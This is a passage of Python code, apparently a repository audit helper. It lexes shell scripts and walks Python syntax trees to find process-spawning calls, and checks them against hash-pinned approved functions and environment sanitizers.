from __future__ import annotations

import ast
import hashlib
import json
import re
import shlex
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
MANIFEST = ROOT / "config" / "trusted-runtime-manifest.json"


def _repo_relative_path(path: Path) -> str | None:
    try:
        return path.resolve().relative_to(ROOT.resolve()).as_posix()
    except ValueError:
        return None


def _approved_script_name(path: Path) -> str | None:
    relative = _repo_relative_path(path)
    special_paths = {
        "run-opencode-busdriver-draft": "scripts/opencode/run-opencode-busdriver-draft",
        "run-pi-busdriver-draft": "scripts/pi/run-pi-busdriver-draft",
        "busdriver-fs-broker.py": "adapters/pi/busdriver-fs-broker.py",
    }
    expected = special_paths.get(path.name, f"scripts/{path.name}")
    return path.name if relative == expected else None

SUBPROCESS_CALLS = {"Popen", "call", "check_call", "check_output", "run"}
SUBPROCESS_SHELL_CALLS = {"getoutput", "getstatusoutput"}
OS_EXEC_CALLS = {
    "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe",
}
OS_SPAWN_CALLS = {"spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe"}
OS_SPAWN_CALLS |= {"posix_spawn", "posix_spawnp"}
OS_SHELL_CALLS = {"system", "popen"}
PTY_SPAWN_CALLS = {"spawn"}
ASYNCIO_EXEC_CALLS = {"create_subprocess_exec"}
ASYNCIO_SHELL_CALLS = {"create_subprocess_shell"}
RUN_SAFE_AST_SHA256 = "7e0b29b9401bea190a32efc086df31a7d5e32c1053073139dcc8790fede8403f"
POSITIONAL_WRAPPER_SHA256 = "faeb1ffeebf99634c6e36f6d2e2fdf91180beb95c097e45ad0d0a0ef347040b3"
REQUIRED_CHECKS_SHELL_DISPATCHES = {
    "$JQ", "/bin/rm", "/usr/bin/awk", "/usr/bin/grep", "/usr/bin/head",
    "/usr/bin/mktemp", "/usr/bin/printf", "/usr/bin/tr",
}
APPROVED_FUNCTION_AST_SHA256 = {
    ("busdriver-fs-broker.py", "run_git"): "59a8ac34abb76572fd8d3750a502c2f950f56539d7d8fb4c4bdaeb5f1a25039b",
    ("hermes-busdriver-agent-draft", "run"): "cfb09c09a6cb56640eab0d21ab5f88423a4e66e5c968131ffecfb947d5e12449",
    ("hermes-busdriver-agent-draft", "run_worker"): "9dba875e2efc13aa99edc6945fc9a577f267112fbf26266362ecb7a66cca88ed",
    ("hermes-busdriver-deliver", "_bounded_run"): "aebd23fe977a27286ddc5756375923211a4556ca61fb826c01a96ab35772372e",
    ("hermes-busdriver-deliver", "git_observation_raw"): "57c1c431bea91baa611f8dfccf32b069acc08b902ff2522e2fc21cefab3845fb",
    ("hermes-busdriver-deliver", "run_safe"): RUN_SAFE_AST_SHA256,
    ("hermes-busdriver-deliver", "run_lock_helper"): "069995533401df04fb627fd64b7fc2e58a33fd265cadad5ad1c171e9c8fb87c4",
    ("hermes-busdriver-deliver", "run_delivery_status"): "d5450a6793775862ede49f767144c84d040a0f2506cc84ad0883cf4f650e0b4e",
    ("hermes-busdriver-deliver", "run_verifiers"): "bd311d7846bebd64ef23970f12e80e57988502fe35866e12c588767060484c7d",
    ("hermes-busdriver-delivery-status", "run"): "a62b222a5b121a979a7628b1127dbc1f43f5ecaedb5325d14e63a4b1e95ef504",
    ("hermes-busdriver-finalization-readiness", "_ingest_json"): "9d12c0f18bb1c20f53ef01e13c732276fb1cabb9aceb16389ba07c77e36d25ac",
    ("hermes-busdriver-gate", "run"): "ad4de567e2eac0afebb3cc5cc90f5ec63eed3fe8e16dddf430bddf7b81000986",
    ("hermes-busdriver-litmus-status", "git"): "718c518936f2f5e9f2d5448b04647adbc9c37eb8d563689fba19dccc35117657",
    ("hermes-busdriver-litmus-status", "branch_diff_hash"): "e428c0d6c654d5441496d9b7b159a7a4e0f74b4c7bcca7cb25630c9022c115ea",
    ("hermes-busdriver-lock", "run"): "ad8fcad819b0bd225a33ca55a598e48c6aeccf1876eeeaa66d290de8f8d28ace",
    ("hermes-busdriver-pr-grind-check", "run"): "e18ae7472e7770d693062a2869b96bd1298c00ba21b257fb10d85e1e652b10d3",
    ("hermes-busdriver-relay-brief", "run"): "63e3c33120b00982240e831c20a66615bae3416fceedd5865eddec8a0932ff09",
    ("hermes-busdriver-smoke", "run"): "a64f01edf251e951c33df2a0845c17a272b34f06ca97618604476f431161a231",
    ("hermes-busdriver-status", "run"): "95369bb68edd800d3da3120ee2b72d71e58bd77d468f4a15c544cd33304864c0",
    ("run-opencode-busdriver-draft", "run"): "b2bda6f8b79f42f0137379bc1c5450e8b4676728e96cf207edee4757e4ea0e0b",
    ("run-pi-busdriver-draft", "run"): "06f0fa5cce5635d2dbaf7f6a88ddc4e25cd19efa8938abfcc7405e140ba6f7a5",
}
# The identical installed run_bounded implementation is approved at these paths.
for _launcher_path in {
    "hermes-busdriver-agent-draft", "hermes-busdriver-deliver", "hermes-busdriver-delivery-status",
    "hermes-busdriver-finalization-readiness", "hermes-busdriver-gate", "hermes-busdriver-litmus-status",
    "hermes-busdriver-lock", "hermes-busdriver-pr-grind-check", "hermes-busdriver-pr-grind-loop",
    "hermes-busdriver-relay-brief", "hermes-busdriver-relay-role", "hermes-busdriver-smoke",
    "hermes-busdriver-status", "run-opencode-busdriver-draft", "run-pi-busdriver-draft",
}:
    APPROVED_FUNCTION_AST_SHA256[(_launcher_path, "run_bounded")] = "c723de307ea7ac262033aac32ab36d6e015165b549185695841b3ff00789a729"
SHELL_BUILTINS = {
    "!", "[[", "[", ":", "break", "case", "cd", "command", "compgen", "continue",
    "declare", "do", "done", "echo", "else", "enable", "esac", "eval", "exec", "exit",
    "export", "false", "fc", "fi", "for", "function", "getopts", "hash", "help", "history",
    "if", "in", "jobs", "kill", "let", "local", "logout", "mapfile", "popd", "printf",
    "pushd", "pwd", "read", "readarray", "readonly", "return", "select", "set", "shift",
    "shopt", "source", "suspend", "test", "then", "times", "trap", "true", "type",
    "typeset", "ulimit", "umask", "unalias", "unset", "until", "wait", "while", "{", "}",
}
FORWARDING_WRAPPERS = {"credential_free_exec"}
BOUNDED_LAUNCHERS = {"run_bounded", "_bounded_run"}
APPROVED_BOUNDED_FORWARDING_ARGUMENTS = {
    ("hermes-busdriver-agent-draft", "run"): "cmd",
    ("hermes-busdriver-deliver", "run_lock_helper"): "cmd",
    ("hermes-busdriver-deliver", "git_observation_raw"): "argv",
    ("hermes-busdriver-deliver", "run_delivery_status"): "cmd",
    ("hermes-busdriver-deliver", "run_verifiers"): "argv",
    ("hermes-busdriver-delivery-status", "run"): "cmd",
    ("hermes-busdriver-lock", "run"): "cmd",
    ("hermes-busdriver-finalization-readiness", "_ingest_json"): "cmd",
    ("hermes-busdriver-gate", "run"): "cmd",
    ("hermes-busdriver-litmus-status", "git"): "cmd",
    ("hermes-busdriver-litmus-status", "branch_diff_hash"): "diff_cmd",
    ("hermes-busdriver-lock", "run"): "cmd",
    ("hermes-busdriver-pr-grind-check", "run"): "argv",
    ("hermes-busdriver-relay-brief", "run"): "argv",
    ("hermes-busdriver-smoke", "run"): "cmd",
    ("hermes-busdriver-status", "run"): "cmd",
    ("run-opencode-busdriver-draft", "run"): "cmd",
    ("run-pi-busdriver-draft", "run"): "cmd",
}
APPROVED_ENV_SANITIZER_AST_SHA256 = {
    ("hermes-busdriver-deliver", "git_observation_env"): "4b80db1488fcef13f0ae435fd59ae2c89de733fe6e5357002faabd734ffe1e2a",
    ("hermes-busdriver-deliver", "safe_git_env"): "1d629f706622121691a9e471e5f9599c03f15b604433b917e128b41559b8aa89",
    ("hermes-busdriver-deliver", "safe_git_mutation_env"): "2da1812be516e88752a2983632745e9fe6881200f7a422f716a10b02da0bd58b",
    ("hermes-busdriver-deliver", "pr_grind_loop_env"): "c783c677366ac07098a65b9ad7da2b90dd0044d41194405068b959d9403a1035",
    ("hermes-busdriver-pr-grind-check", "safe_subprocess_env"): "419270deb1a43be09445cf614d8eb105a3de1a4539ba1a86f033d799ea13f515",
    ("hermes-busdriver-pr-grind-check", "safe_local_script_env"): "63c797ea204154a6ebadd385e7865d54437a5e5baff70d68a8551426114c01c8",
    ("hermes-busdriver-pr-grind-check", "safe_github_helper_env"): "eb644f0b1e0eb8ad2e1ee02d8c5ea77d0e90a5189dd66014db494a2b5b9f96b9",
    ("hermes-busdriver-pr-grind-loop", "safe_subprocess_env"): "ec26bf32138decad64911a78e9a267354152e6372a9adfe5f87b1688e6ff65f2",
    ("hermes-busdriver-relay-role", "child_env"): "a63ae026b2d42c39ba07426f625cf3fc9bc953e91451e07a5a5ec5a732adc2d9",
    ("hermes-busdriver-smoke", "child_env"): "70921e22133ee52201cc89ca5478c95661c1f7cd14ebe5c797cf69971c6fd38d",
    ("run-opencode-busdriver-draft", "git_env"): "a6d30ace4c5d991ac90cab53663a9986505eb1fbe701c673263f729367616a31",
}


class ShellScanError(ValueError):
    pass


@dataclass(frozen=True)
class ShellToken:
    kind: str
    value: str
    line: int


def _shell_tokens(source: str, line_offset: int = 0) -> tuple[list[ShellToken], list[tuple[str, int]]]:
    """Lex shell words/operators and return nested command/process substitutions separately."""
    tokens: list[ShellToken] = []
    substitutions: list[tuple[str, int]] = []
    word: list[str] = []
    word_line = 1
    i = 0
    line = 1

    def flush() -> None:
        nonlocal word
        if word:
            tokens.append(ShellToken("word", "".join(word), word_line + line_offset))
            word = []

    def comment_start(position: int) -> bool:
        """Bash recognizes comments only where a new token could begin."""
        return position == 0 or source[position - 1] in " \t\r\n;|&(){}<>"

    def skip_comment(position: int) -> int:
        end = source.find("\n", position)
        return len(source) if end < 0 else end

    def escaped_by_odd_backslashes(position: int) -> bool:
        slashes = 0
        cursor = position - 1
        while cursor >= 0 and source[cursor] == "\\":
            slashes += 1
            cursor -= 1
        return bool(slashes % 2)

    def substitution(start: int, process: bool = False) -> int:
        nonlocal line
        depth, quote, escaped = 1, "", False
        j = start + 2
        inner_line = line
        while j < len(source):
            char = source[j]
            if char == "\n":
                line += 1
            if escaped:
                escaped = False
            elif char == "\\" and quote != "'":
                escaped = True
            elif quote:
                if char == quote:
                    quote = ""
            elif char in "'\"":
                quote = char
            elif char == "#" and comment_start(j):
                j = skip_comment(j)
                continue
            elif char == "(" and (j == 0 or source[j - 1] != "$"):
                depth += 1
            elif char == ")":
                depth -= 1
                if depth == 0:
                    substitutions.append((source[start + 2:j], inner_line + line_offset))
                    return j + 1
            j += 1
        raise ShellScanError(f"unclosed_{'process' if process else 'command'}_substitution:{inner_line + line_offset}")

    def legacy_substitution(start: int) -> int:
        nonlocal line
        j = start + 1
        inner_line = line
        while j < len(source):
            char = source[j]
            if char == "\n":
                line += 1
            if char == "\\":
                slash_start = j
                while j < len(source) and source[j] == "\\":
                    j += 1
                if j < len(source) and source[j] == "`" and (j - slash_start) % 2:
                    # The outer legacy substitution consumes one escape before a
                    # nested backtick.  Preserve every other slash so recursive
                    # scanning sees exactly the next expansion layer.
                    j += 1
                    continue
                continue
            if char == "#" and comment_start(j):
                j = skip_comment(j)
                continue
            if char == "`":
                body = source[start + 1:j]
                normalized: list[str] = []
                k = 0
                while k < len(body):
                    if body[k] != "\\":
                        normalized.append(body[k]); k += 1; continue
                    slash_start = k
                    while k < len(body) and body[k] == "\\": k += 1
                    slashes = k - slash_start
                    if k < len(body) and body[k] == "`" and slashes % 2:
                        slashes //= 2
                    normalized.append("\\" * slashes)
                substitutions.append(("".join(normalized), inner_line + line_offset))
                return j + 1
            j += 1
        raise ShellScanError(f"unclosed_legacy_command_substitution:{inner_line + line_offset}")

    def arithmetic(start: int) -> int:
        nonlocal line
        depth = 2
        quote = ""
        escaped = False
        j = start + 3
        inner_line = line
        while j < len(source):
            char = source[j]
            if char == "\n":
                line += 1
            if escaped:
                escaped = False
            elif char == "\\" and quote != "'":
                escaped = True
            elif quote:
                if char == quote:
                    quote = ""
                elif quote == '"' and char == "$" and source.startswith("$(", j):
                    j = arithmetic(j) if source.startswith("$((", j) else substitution(j)
                    continue
                elif quote == '"' and char == "`":
                    j = legacy_substitution(j)
                    continue
            elif char in "'\"":
                quote = char
            elif char == "#" and comment_start(j):
                j = skip_comment(j)
                continue
            elif char == "$" and source.startswith("$((", j):
                j = arithmetic(j)
                continue
            elif char == "$" and source.startswith("$(", j):
                j = substitution(j)
                continue
            elif char == "`":
                j = legacy_substitution(j)
                continue
            elif char == "(":
                depth += 1
            elif char == ")":
                depth -= 1
                if depth == 0:
                    return j + 1
            j += 1
        raise ShellScanError(f"unclosed_arithmetic:{inner_line + line_offset}")

    operators = (";;&", ";;", ";&", "&&", "||", "|&", "<<-", "<<<", "<<", ">>", "<>", ">&", "<&", "&>", "&>>")
    while i < len(source):
        char = source[i]
        if char == "\\" and i + 1 < len(source) and source[i + 1] == "\n":
            i += 2
            line += 1
            continue
        if char == "\n":
            flush(); tokens.append(ShellToken("op", "\n", line + line_offset)); line += 1; i += 1; continue
        if char in " \t\r":
            flush(); i += 1; continue
        if char == "#" and not word:
            end = source.find("\n", i)
            i = len(source) if end < 0 else end
            continue
        if char in "'\"":
            if not word:
                word_line = line
            quote = char; word.append(char); i += 1
            while i < len(source):
                qchar = source[i]
                word.append(qchar)
                if qchar == "\n": line += 1
                if qchar == quote and (quote == "'" or not escaped_by_odd_backslashes(i)):
                    i += 1; break
                if quote == '"' and qchar == "$" and source.startswith("$((", i):
                    word.pop(); i = arithmetic(i); word.append("$((...))"); continue
                if quote == '"' and qchar == "$" and source.startswith("$(", i):
                    word.pop(); i = substitution(i); word.append("$(...)"); continue
                if quote == '"' and qchar == "`":
                    word.pop(); i = legacy_substitution(i); word.append("`...`"); continue
                i += 1
            else:
                raise ShellScanError(f"unclosed_quote:{word_line + line_offset}")
            continue
        if char == "$" and i + 2 < len(source) and source[i + 1:i + 3] == "((":
            if not word: word_line = line
            i = arithmetic(i); word.append("$((...))"); continue
        if char == "$" and i + 1 < len(source) and source[i + 1] == "(":
            if not word: word_line = line
            i = substitution(i); word.append("$(...)"); continue
        if char in "<>" and i + 1 < len(source) and source[i + 1] == "(":
            flush()
            process_line = line
            marker = char + "(...)"
            i = substitution(i, process=True)
            tokens.append(ShellToken("word", marker, process_line + line_offset))
            continue
        if char == "`":
            if not word: word_line = line
            i = legacy_substitution(i); word.append("`...`"); continue
        op = next((candidate for candidate in operators if source.startswith(candidate, i)), "")
        if op or char in ";|&(){}<>":
            value = op or char
            if char in "<>" and word and re.fullmatch(r"[0-9]+", "".join(word)):
                tokens.append(ShellToken("io_number", "".join(word), word_line + line_offset))
                word = []
            else:
                flush()
            tokens.append(ShellToken("op", value, line + line_offset)); i += len(value); continue
        if char == "\\" and i + 1 < len(source):
            if not word: word_line = line
            word.extend(source[i:i + 2]); i += 2; continue
        if not word: word_line = line
        word.append(char); i += 1
    flush()
    return tokens, substitutions


def _shell_word(token: str) -> str:
    if len(token) >= 2 and token[0] == token[-1] and token[0] in "'\"":
        token = token[1:-1]
    return token


def _scan_shell(source: str, line_offset: int = 0, known_functions: set[str] | None = None) -> set[str]:
    tokens, substitutions = _shell_tokens(source, line_offset)
    functions = set(known_functions or ()) | {
        _shell_word(tokens[i].value)
        for i in range(len(tokens) - 2)
        if tokens[i].kind == "word" and tokens[i + 1].value == "(" and tokens[i + 2].value == ")"
        and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", _shell_word(tokens[i].value))
    }
    found: set[str] = set()
    expected = True
    redirect = False
    wrapper = False
    forwarder = ""
    forwarder_option_arg = False
    forwarder_requires_head = False
    time_prefix = False
    case_state = ""
    conditional = False
    separators = {"\n", ";", "&", "&&", "||", "|", "|&", "(", "{"}
    redirects = {"<", ">", ">>", "<<", "<<-", "<<<", "<>", ">&", "<&", "&>", "&>>"}
    assignments = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(?:\+)?=.*", re.S)
    i = 0
    while i < len(tokens):
        token = tokens[i]
        value = _shell_word(token.value)
        if conditional:
            if value == "]]": conditional = False; expected = False
            i += 1; continue
        if redirect:
            if token.kind != "word": raise ShellScanError(f"ambiguous_redirection:{token.line}")
            redirect = False; i += 1; continue
        if token.kind == "io_number":
            if i + 1 >= len(tokens) or tokens[i + 1].value not in redirects:
                raise ShellScanError(f"ambiguous_redirection:{token.line}")
            i += 1; continue
        if token.value in redirects:
            redirect = True; i += 1; continue
        if case_state == "pattern":
            if token.value == ")": case_state = "body"; expected = True
            i += 1; continue
        if token.value in {";;", ";&", ";;&"}:
            case_state = "pattern"; expected = False; i += 1; continue
        if token.value in separators:
            if forwarder_option_arg or forwarder_requires_head or time_prefix:
                raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:{forwarder}:missing_executable")
            forwarder = ""
            forwarder_option_arg = False
            expected = True; i += 1; continue
        if token.value in {")", "}"}:
            expected = False; i += 1; continue
        if token.kind != "word":
            raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:{token.value}")
        if value == "case" and expected:
            case_state = "subject"; expected = False; i += 1; continue
        if value == "in" and case_state == "subject":
            case_state = "pattern"; i += 1; continue
        if value == "esac":
            case_state = ""; expected = False; i += 1; continue
        if value in {"if", "then", "elif", "else", "while", "until", "do"}:
            expected = True; i += 1; continue
        if value in {"fi", "done"}:
            expected = False; i += 1; continue
        if value in {"for", "select"} and expected:
            expected = False; i += 1; continue
        if forwarder_option_arg:
            forwarder_option_arg = False; i += 1; continue
        forwarded_head = False
        if forwarder:
            if value == "--":
                forwarder = "forwarded"; i += 1; continue
            if forwarder == "command" and re.fullmatch(r"-[pVv]+", value):
                i += 1; continue
            if forwarder == "exec" and re.fullmatch(r"-[cl]+", value):
                i += 1; continue
            if forwarder == "exec" and value == "-a":
                forwarder_option_arg = True; forwarder_requires_head = True; i += 1; continue
            if forwarder != "forwarded" and value.startswith("-"):
                raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:{forwarder}:{value}")
            forwarder = ""
            forwarder_requires_head = False
            forwarded_head = True
        if assignments.fullmatch(value) and (expected or wrapper) and not forwarded_head:
            i += 1; continue
        if not expected and not wrapper:
            i += 1; continue
        if value in {"function"}:
            expected = False; i += 1; continue
        if i + 2 < len(tokens) and tokens[i + 1].value == "(" and tokens[i + 2].value == ")":
            expected = False; i += 3; continue
        if value in FORWARDING_WRAPPERS:
            wrapper = True; expected = False; i += 1; continue
        if value == "trap":
            if i + 1 >= len(tokens) or tokens[i + 1].kind != "word":
                raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:trap")
            handler = tokens[i + 1].value
            literal = len(handler) >= 2 and handler[0] == handler[-1] and handler[0] in "'\""
            body = _shell_word(handler)
            if literal:
                found.update(_scan_shell(body, tokens[i + 1].line - 1, functions))
            elif body not in functions and body not in {"-", ""}:
                raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:trap:{body}")
            expected = False; i += 2; continue
        if value == "eval":
            raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:eval")
        if value in {"command", "builtin", "exec"}:
            forwarder = value; expected = True; i += 1; continue
        actual_forwarded_head = forwarded_head or wrapper
        if value == "!" and expected and not actual_forwarded_head:
            i += 1; continue
        if value == "time" and expected and not actual_forwarded_head:
            time_prefix = True; i += 1; continue
        if time_prefix and value == "-p":
            i += 1; continue
        if time_prefix and value.startswith("-"):
            raise ShellScanError(f"ambiguous_shell_dispatch:{token.line}:time:{value}")
        if value == "[[":
            conditional = True; expected = False; i += 1; continue
        if wrapper and value.startswith("-"):
            i += 1; continue
        if actual_forwarded_head or (value not in SHELL_BUILTINS and value not in functions):
            found.add(value)
        wrapper = False; time_prefix = False; expected = False; i += 1
    if redirect: raise ShellScanError("ambiguous_redirection:eof")
    if forwarder_option_arg: raise ShellScanError(f"ambiguous_shell_dispatch:eof:{forwarder}:missing_option_argument")
    if forwarder_requires_head: raise ShellScanError(f"ambiguous_shell_dispatch:eof:{forwarder}:missing_executable")
    if conditional: raise ShellScanError("unclosed_conditional:eof")
    if time_prefix: raise ShellScanError("ambiguous_shell_dispatch:eof:time:missing_executable")
    for nested, nested_line in substitutions:
        found.update(_scan_shell(nested, nested_line - 1, functions))
    return found


def installed_sources() -> set[Path]:
    manifest = json.loads(MANIFEST.read_text())
    names = set(manifest["production_entrypoints"]) | set(manifest["adapter_runtime"])
    return {ROOT / name for name in names}


def tracked_runtime_sources() -> list[Path]:
    proc = subprocess.run(
        ["/usr/bin/git", "ls-files", "-z", "--", "scripts", "adapters"],
        cwd=ROOT,
        capture_output=True,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr.decode("utf-8", errors="replace")
    return sorted(ROOT / raw.decode("utf-8") for raw in proc.stdout.split(b"\0") if raw)


def discovered_dispatch_consumers(extra_paths: tuple[Path, ...] = ()) -> set[Path]:
    consumers: set[Path] = set()
    for sources in (sorted(set(tracked_runtime_sources()) | set(extra_paths)),):
        for path in sources:
            if not path.is_file() or path.suffix in {".md", ".json"}:
                continue
            text = path.read_text(errors="replace")
            shell_failure = shell_syntax_failure(path, text)
            try:
                shell_dispatches = shell_external_dispatches(path, text)
            except ShellScanError:
                shell_dispatches = set()
                shell_failure = shell_failure or "unparsed_shell"
            python_consumer = False
            if path.suffix not in {".ts", ".js"} and not is_shell(path, text):
                try:
                    tree = ast.parse(text)
                except SyntaxError:
                    tree = None
                if tree is not None:
                    modules = _python_process_bindings(tree)
                    parents = {child: parent for parent in ast.walk(tree) for child in ast.iter_child_nodes(parent)}
                    local_bindings = _python_local_constants(tree, parents, path)
                    bounded_aliases = _python_bounded_launcher_aliases(tree)
                    for node in ast.walk(tree):
                        if not isinstance(node, ast.Call):
                            continue
                        scope = parents.get(node)
                        while scope is not None and not isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
                            scope = parents.get(scope)
                        process_callable = _resolved_python_process_callable(
                            node.func, scope, local_bindings, modules[:9], modules[9], modules[10]
                        ) if scope is not None else None
                        python_consumer |= process_callable is not None or (
                            isinstance(node.func, ast.Name) and node.func.id in bounded_aliases
                        )
            direct_failure = bool(direct_dispatch_violations(path, text))
            if direct_failure or shell_failure or python_consumer or re.search(
                r"\b(?:subprocess\.|os\.(?:exec|spawn|system\s*\(|popen\s*\()|"
                r"(?:execFile(?:Sync)?|spawn(?:Sync)?|exec(?:Sync)?)\s*\(|"
                r"(?:node:)?child_process)",
                text,
            ) or shell_dispatches:
                consumers.add(path)
    return consumers


def discovered_shell_failures() -> list[str]:
    failures: list[str] = []
    for _ in (None,):
        for path in tracked_runtime_sources():
            if not path.is_file(): continue
            text = path.read_text(errors="replace")
            if not is_shell(path, text): continue
            syntax = shell_syntax_failure(path, text)
            if syntax: failures.append(f"{path.relative_to(ROOT)}:{syntax}")
            try:
                shell_external_dispatches(path, text)
            except ShellScanError as exc:
                failures.append(f"{path.relative_to(ROOT)}:unparsed_shell:{exc}")
    return failures


def is_shell(path: Path, source: str) -> bool:
    first = source.splitlines()[0] if source.splitlines() else ""
    return path.suffix == ".sh" or first in {"#!/bin/bash", "#!/bin/sh"}


def shell_external_dispatches(path: Path, source: str | None = None) -> set[str]:
    """Derive external command heads from shell command positions, independent of their names."""
    text = path.read_text() if source is None else source
    if not is_shell(path, text):
        return set()
    dispatches = _scan_shell(text)
    if (
        _repo_relative_path(path) == "scripts/check-required-checks.sh"
        and hashlib.sha256(text.encode()).hexdigest() == POSITIONAL_WRAPPER_SHA256
    ):
        dispatches.difference_update({"$@", "${@}", "$*", "${*}"})
    return dispatches


def shell_syntax_failure(path: Path, source: str | None = None) -> str | None:
    text = path.read_text() if source is None else source
    if not is_shell(path, text):
        return None
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", encoding="utf-8") as candidate:
        candidate.write(text); candidate.flush()
        result = subprocess.run(
            ["/bin/bash", "-n", candidate.name],
            stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={"PATH": "/usr/bin:/bin", "LC_ALL": "C"}, check=False,
        )
    if result.returncode:
        detail = result.stderr.strip().splitlines()[-1] if result.stderr.strip() else "status=" + str(result.returncode)
        return "invalid_shell_syntax:" + detail
    return None


PythonBindings = dict[ast.AST, dict[str, list[tuple[int, int, ast.AST | None]]]]


def _python_local_constants(
    tree: ast.AST, parents: dict[ast.AST, ast.AST], path: Path
) -> PythonBindings:
    """Collect every local write, retaining source order and invalidating opaque writes."""
    scopes = (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)
    bindings: PythonBindings = {}

    def target_values(target: ast.AST, value: ast.AST | None) -> list[tuple[str, ast.AST | None]]:
        if isinstance(target, ast.Name):
            return [(target.id, value)]
        if isinstance(target, ast.Subscript) and isinstance(target.value, ast.Name):
            return [(target.value.id, None)]
        if isinstance(target, ast.Starred):
            return target_values(target.value, None)
        if isinstance(target, (ast.Tuple, ast.List)):
            values = value.elts if isinstance(value, (ast.Tuple, ast.List)) and len(value.elts) == len(target.elts) else [None] * len(target.elts)
            return [item for child, child_value in zip(target.elts, values) for item in target_values(child, child_value)]
        return []

    def subscript_target_names(target: ast.AST) -> set[str]:
        if isinstance(target, ast.Subscript) and isinstance(target.value, ast.Name):
            return {target.value.id}
        if isinstance(target, ast.Starred):
            return subscript_target_names(target.value)
        if isinstance(target, (ast.Tuple, ast.List)):
            return set().union(*(subscript_target_names(child) for child in target.elts)) if target.elts else set()
        return set()

    # A straight-line write earlier in the same try/with body reaches a later
    # statement in that body whenever that statement executes. Branch and loop
    # bodies, by contrast, may execute zero or multiple times.
    conditional_nodes = (ast.If, ast.For, ast.AsyncFor, ast.While, ast.Match, ast.comprehension)

    def source_nodes(scope: ast.AST):
        """Yield a scope in lexical order, never leaking writes from child scopes."""
        children = sorted(ast.iter_child_nodes(scope), key=lambda child: (
            getattr(child, "lineno", -1), getattr(child, "col_offset", -1),
            getattr(child, "end_lineno", -1), getattr(child, "end_col_offset", -1),
        ))
        for child in children:
            yield child
            if not isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)):
                yield from source_nodes(child)

    def alias_component(scope: ast.AST, name: str, position: tuple[int, int]) -> set[str]:
        """Return names transitively joined by prior straight-line alias assignments."""
        related = {name}
        changed = True
        while changed:
            changed = False
            for candidate, history in bindings.get(scope, {}).items():
                for line, column, value in history:
                    if (line, column) >= position or not isinstance(value, ast.Name):
                        continue
                    if candidate in related or value.id in related:
                        before = len(related)
                        related.update({candidate, value.id})
                        changed |= len(related) != before
            for earlier in source_nodes(scope):
                earlier_position = (
                    getattr(earlier, "lineno", -1), getattr(earlier, "col_offset", -1)
                )
                if earlier_position >= position or not isinstance(earlier, ast.Assign):
                    continue
                chained = {
                    target.id for target in earlier.targets if isinstance(target, ast.Name)
                }
                if len(chained) > 1 and related.intersection(chained):
                    before = len(related)
                    related.update(chained)
                    changed |= len(related) != before
        return related

    all_scopes = [tree] + [node for node in ast.walk(tree) if isinstance(node, scopes[1:])]
    for lexical_scope in all_scopes:
      for node in source_nodes(lexical_scope):
        writes: list[tuple[str, ast.AST | None]] = []
        if isinstance(node, ast.Assign):
            for target in node.targets:
                writes.extend(target_values(target, node.value))
        elif isinstance(node, ast.AnnAssign):
            writes.extend(target_values(node.target, node.value))
        elif isinstance(node, (ast.AugAssign, ast.NamedExpr)):
            writes.extend(target_values(node.target, node if isinstance(node, ast.AugAssign) else node.value))
        elif isinstance(node, ast.Delete):
            for target in node.targets:
                writes.extend(target_values(target, None))
        elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            writes.append((node.name, node))
        elif isinstance(node, ast.Import):
            for imported_name in node.names:
                writes.append((imported_name.asname or imported_name.name.split(".", 1)[0], node))
        elif isinstance(node, ast.ImportFrom):
            for imported_name in node.names:
                if imported_name.name != "*":
                    writes.append((imported_name.asname or imported_name.name, node))
        elif (
            isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.attr in {
                "__delitem__", "__setitem__", "clear", "insert", "pop", "remove", "reverse", "sort",
            }
        ):
            # Mutating an alias mutates the same argv object. Build the prior
            # name-to-name assignment component conservatively and invalidate
            # every related spelling, including parameters with no own write.
            related = alias_component(
                lexical_scope, node.func.value.id, (node.lineno, node.col_offset)
            )
            writes.extend((name, None) for name in sorted(related))
        subscript_mutations: set[str] = set()
        if isinstance(node, ast.Assign):
            for target in node.targets:
                subscript_mutations.update(subscript_target_names(target))
        elif isinstance(node, (ast.AnnAssign, ast.AugAssign, ast.NamedExpr)):
            subscript_mutations.update(subscript_target_names(node.target))
        elif isinstance(node, ast.Delete):
            for target in node.targets:
                subscript_mutations.update(subscript_target_names(target))
        for name in sorted(subscript_mutations):
            related = alias_component(
                lexical_scope, name,
                (getattr(node, "lineno", -1), getattr(node, "col_offset", -1)),
            )
            writes.extend((alias, None) for alias in sorted(related))
        if not writes:
            continue
        scope = lexical_scope
        conditional = parents.get(node)
        ambiguous = False
        while conditional is not None and conditional is not lexical_scope:
            if isinstance(conditional, conditional_nodes):
                ambiguous = True
            conditional = parents.get(conditional)
        for name, value in writes:
            bindings.setdefault(scope, {}).setdefault(name, []).append(
                (node.lineno, node.col_offset,
                 value if not ambiguous or isinstance(value, ast.AugAssign) else None)
            )

    for scope_bindings in bindings.values():
        for history in scope_bindings.values():
            history.sort(key=lambda item: (item[0], item[1]))
    (
        subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
        pty_modules, multiprocessing_modules, sys_modules, import_calls, import_module_calls,
        imported_process_calls,
    ) = _python_process_bindings(tree)
    process_modules = (
        subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
        pty_modules, multiprocessing_modules, sys_modules, import_calls,
    )
    nonmutating_builtins = {
